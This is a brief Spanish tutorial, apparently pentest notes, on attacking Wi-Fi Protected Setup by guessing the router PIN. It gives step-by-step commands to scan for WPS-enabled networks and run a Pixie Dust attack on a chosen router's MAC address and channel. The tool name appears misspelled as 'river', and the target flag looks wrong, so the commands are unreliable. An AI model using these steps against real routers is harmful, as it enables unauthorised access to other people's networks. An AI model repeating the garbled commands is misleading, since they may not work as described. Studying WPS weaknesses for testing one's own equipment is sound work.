# Ataque WPS

WPS (Wi-Fi Protected Setup) es un estándar de seguridad diseñado para simplificar el proceso de conexión de dispositivos a una red inalámbrica de manera más fácil y segura. Fue desarrollado para permitir que los usuarios conecten sus dispositivos a una red Wi-Fi sin necesidad de introducir manualmente una contraseña larga.

Los atacantes pueden intentar adivinar este PIN, que es fácil de descifrar debido a su corto tamaño (8 dígitos). Cuando el atacante encuentra el PIN correcto, puede obtener la contraseña del router si el **WPS está habilitado**.

Muchos router tienen medidas de seguridad,como bloquear después de muchos intentos o tiene el wps apagado.

## Pasos de ataque:

1.  **Comando Wash** para escanear redes Wi-Fi con WPS habilitado:

    ```bash
    wash -i <nombre_de_tu_interfaz> -C
    ```

    * `-i <nombre_de_tu_interfaz`
    * `-C`: Ignora ciertos errores de tramas.
2.  **Comando River** para intentar un ataque WPS a una red seleccionada:

    ```bash
    river -i <nombre_de_tu_interfaz> -P <MAC_del_router_objetivo> -c <canal_de_red> -v -K
    ```

    * `-i <nombre_de_tu_interfaz>`
    * `-P <MAC_del_router_objetivo>`
    * `-c <canal_de_red>`
    * `-K`: Usa la herramienta Pixie para realizar el ataque WPS.

**Mas informacion:**

[https://www.thehacker.recipes/radio/wi-fi/wps/](https://www.thehacker.recipes/radio/wi-fi/wps/)
